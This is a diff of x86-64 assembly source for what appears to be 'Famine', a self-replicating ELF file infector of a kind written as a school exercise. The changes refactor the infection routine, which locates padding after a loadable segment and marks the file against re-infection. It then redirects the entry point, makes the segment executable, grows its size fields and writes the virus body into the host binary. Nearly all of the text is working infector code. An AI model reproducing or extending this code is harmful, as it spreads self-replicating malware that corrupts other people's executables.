@@ -417,11 +417,12 @@ print_rax:
 			pop		rdi
 			pop		rcx
 			pop		r11
+
 			; r9 -> target_phdr offset
 			cmp		dword [rel elfp0], 1 ; est-ce un load ?
 			jne		.next_it_phdr
-			mov		rax, qword [rel elfp0 + 0x08]  ; p_offset
-			add		rax, qword [rel elfp0 + 0x20] ; p_filesz
+			mov		rax, qword [rel elfp0 + phdr.p_offset]  ; p_offset
+			add		rax, qword [rel elfp0 + phdr.p_filesz] ; p_filesz
 
 			cmp		rax, r11
 			jna		.next_it_phdr
@@ -450,15 +451,16 @@ print_rax:
 
 			; check padding size
 			; padding = next_header_off - (curr_header_off + header_size)
-			mov		rax, [rel elfp1 + 0x8] ; p_offset next seg
-			mov		rdx, [rel elfp0 + 0x8] ; p_offset curr seg
-			add		rdx, [rel elfp0 + 0x20]
+			mov		rax, [rel elfp1 + phdr.p_offset] ; p_offset next seg
+			mov		rdx, [rel elfp0 + phdr.p_offset] ; p_offset curr seg
+			add		rdx, [rel elfp0 + phdr.p_filesz]
 			sub		rax, rdx
 
 			; padding < FAMINE_SIZE
 			cmp		rax, FAMINE_SIZE
 			jl		.close_file
 
+			; mark file for avoid re-infection
 			push	r9
 			push	r11
 			mov		rax, SYS_pwrite64
@@ -470,16 +472,16 @@ print_rax:
 			pop		r11
 			pop		r9
 
-
+			; compute new entry point
 			push	r11
-			mov		rax, [rel elfp1 + 0x8]
+			mov		rax, [rel elfp1 + phdr.p_offset]
 			sub		r11, rax
-			mov		rax, [rel elfp1 + 0x10]
+			mov		rax, [rel elfp1 + phdr.p_vaddr]
 			add		r11, rax
 			mov		[rel entry], r11
 			pop		r11
 
-
+			; write new entry point
 			push	r9
 			push	r11
 			mov		rax, SYS_pwrite64
@@ -491,6 +493,7 @@ print_rax:
 			pop		r11
 			pop		r9
 
+			; write exec flag in p_flags
 			push	r9
 			push	r11
 			mov		rax, SYS_pwrite64
@@ -503,28 +506,24 @@ print_rax:
 			pop		r11
 			pop		r9
 
+			; compute p_filesz
 			push	r11
-			lea		rdi, [rel _start]
-			lea		r11, [rel end_addr]
-			sub		r11, rdi
+			mov		rdi, [rel elfp1 + phdr.p_filesz]
+			add		rdi, FAMINE_SIZE
+			mov		[rel elfp1 + phdr.p_filesz], rdi
 
-			mov		rdi, [rel elfp1 + 0x20]
-			add		rdi, r11
-			mov		[rel elfp1 + 0x20], rdi
-
-			lea		rdi, [rel _start]
-			mov		r11, FAMINE_SIZE
-
-			mov		rdi, qword [rel elfp1 + 0x28]
-			add		rdi, r11
-			mov		[rel elfp1 + 0x28], rdi
+			; compute p_memsz
+			mov		rdi, qword [rel elfp1 + phdr.p_memsz]
+			add		rdi, FAMINE_SIZE
+			mov		[rel elfp1 + phdr.p_memsz], rdi
 			pop		r11
 
+			; write p_filesz
 			push	r9
 			push	r11
 			mov		rax, SYS_pwrite64
 			mov		rdi, r12
-			lea		rsi, [rel elfp1 + 0x20]
+			lea		rsi, [rel elfp1 + phdr.p_filesz]
 			mov		rdx, 8
 			mov		r10, r9
 			add		r10, 0x20
@@ -532,19 +531,20 @@ print_rax:
 			pop		r11
 			pop		r9
 
+			; write p_memsz
 			push	r9
 			push	r11
-			mov		rax, SYS_pwrite64
 			mov		rdi, r12
-			lea		rsi, [rel elfp1 + 0x28]
+			lea		rsi, [rel elfp1 + phdr.p_memsz]
 			mov		rdx, 8
 			mov		r10, r9
 			add		r10, 0x28
+			mov		rax, SYS_pwrite64
 			syscall
 			pop		r11
 			pop		r9
 
-			; inject the code
+			; write famine
 			push	r11
 			push	r9
 			lea		rsi, [rel _start]
@@ -555,7 +555,6 @@ print_rax:
 			syscall
 			pop		r9
 			pop		r11
-
 
 	.close_file:
 		mov		rax, SYS_close
@@ -614,48 +613,6 @@ end_:
 		mov		rax, SYS_exit
 		xor		rdi, rdi
 		syscall
-
-_add_empty_section:
-	PUSH_ALL
-
-	mov     rax, [rel elfb + 0x28]
-	movzx   rbx, word [rel elfb + 0x3A]
-	movzx   rcx, word [rel elfb + 0x3C]
-
-	imul    rbx, rcx
-	add     rax, rbx
-	mov     r8, rax
-
-	lea     rdi, [rel elfp0]
-
-	mov     rcx, 8
-	xor     rax, rax
-	rep     stosq
-
-	mov     dword [elfp0 + 0x00], 1
-	mov     dword [elfp0 + 0x04], 1
-	mov     qword [elfp0 + 0x30], 1
-
-	mov     rax, SYS_pwrite64
-	mov     rdi, r12
-	lea     rsi, [rel elfp0]
-	mov     rdx, 64
-	mov     r10, r8
-	syscall
-
-	movzx   rax, word [rel elfb + 0x3C]
-	inc     ax
-	mov     [rel elfb + 0x3C], ax
-
-	mov     rax, SYS_pwrite64
-	mov     rdi, r12
-	lea     rsi, [rel elfb]
-	mov     rdx, 64
-	mov     r10, 0
-	syscall
-
-	POP_ALL
-	ret
 
 ; -----
 
